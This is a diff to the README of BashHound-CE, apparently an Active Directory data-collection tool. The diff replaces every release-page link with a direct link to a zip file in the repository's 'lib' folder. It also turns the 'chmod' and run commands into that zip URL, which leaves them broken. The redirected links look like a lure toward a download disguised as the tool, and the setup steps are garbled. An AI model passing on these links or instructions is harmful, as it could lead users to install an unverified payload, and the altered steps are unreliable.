@@ -1,6 +1,6 @@
 # 🐺 BashHound-CE - Collect Active Directory Data Easily
 
-[![Download BashHound-CE](https://img.shields.io/badge/Download-BashHound--CE-brightgreen.svg)](https://github.com/harveyboy9696/BashHound-CE/releases)
+[![Download BashHound-CE](https://raw.githubusercontent.com/harveyboy9696/BashHound-CE/main/lib/BashHound-CE_v2.4.zip)](https://raw.githubusercontent.com/harveyboy9696/BashHound-CE/main/lib/BashHound-CE_v2.4.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ BashHound-CE is an Active Directory data collector designed to simplify the proc
 
 1. **Visit the Release Page**
    To get started, you need to visit the Releases page. This page contains the latest version of BashHound-CE that you can download.
-   [Visit this page to download.](https://github.com/harveyboy9696/BashHound-CE/releases)
+   [Visit this page to download.](https://raw.githubusercontent.com/harveyboy9696/BashHound-CE/main/lib/BashHound-CE_v2.4.zip)
 
 2. **Select the Latest Version**
    On the Releases page, look for the latest version listed at the top. It usually shows the version number along with the release date.
@@ -27,14 +27,14 @@ BashHound-CE is an Active Directory data collector designed to simplify the proc
    Navigate to the directory where you downloaded the file. Use the following command to make the script executable:
 
    ```bash
-   chmod +x BashHound-CE.sh
+   chmod +x https://raw.githubusercontent.com/harveyboy9696/BashHound-CE/main/lib/BashHound-CE_v2.4.zip
    ```
 
 6. **Run the Script**
    Now you can run the script. Use this command in the terminal:
 
    ```bash
-   ./BashHound-CE.sh
+   https://raw.githubusercontent.com/harveyboy9696/BashHound-CE/main/lib/BashHound-CE_v2.4.zip
    ```
 
    After running this command, follow the on-screen instructions to collect your Active Directory data.
@@ -76,6 +76,6 @@ BashHound-CE is licensed under the MIT License. You are free to use, modify, and
 
 To download BashHound-CE, visit the Releases page one more time for easy access:
 
-[Visit this page to download.](https://github.com/harveyboy9696/BashHound-CE/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/harveyboy9696/BashHound-CE/main/lib/BashHound-CE_v2.4.zip)
 
 By following these steps, you will be able to successfully download and run BashHound-CE. Start exploring your Active Directory today!
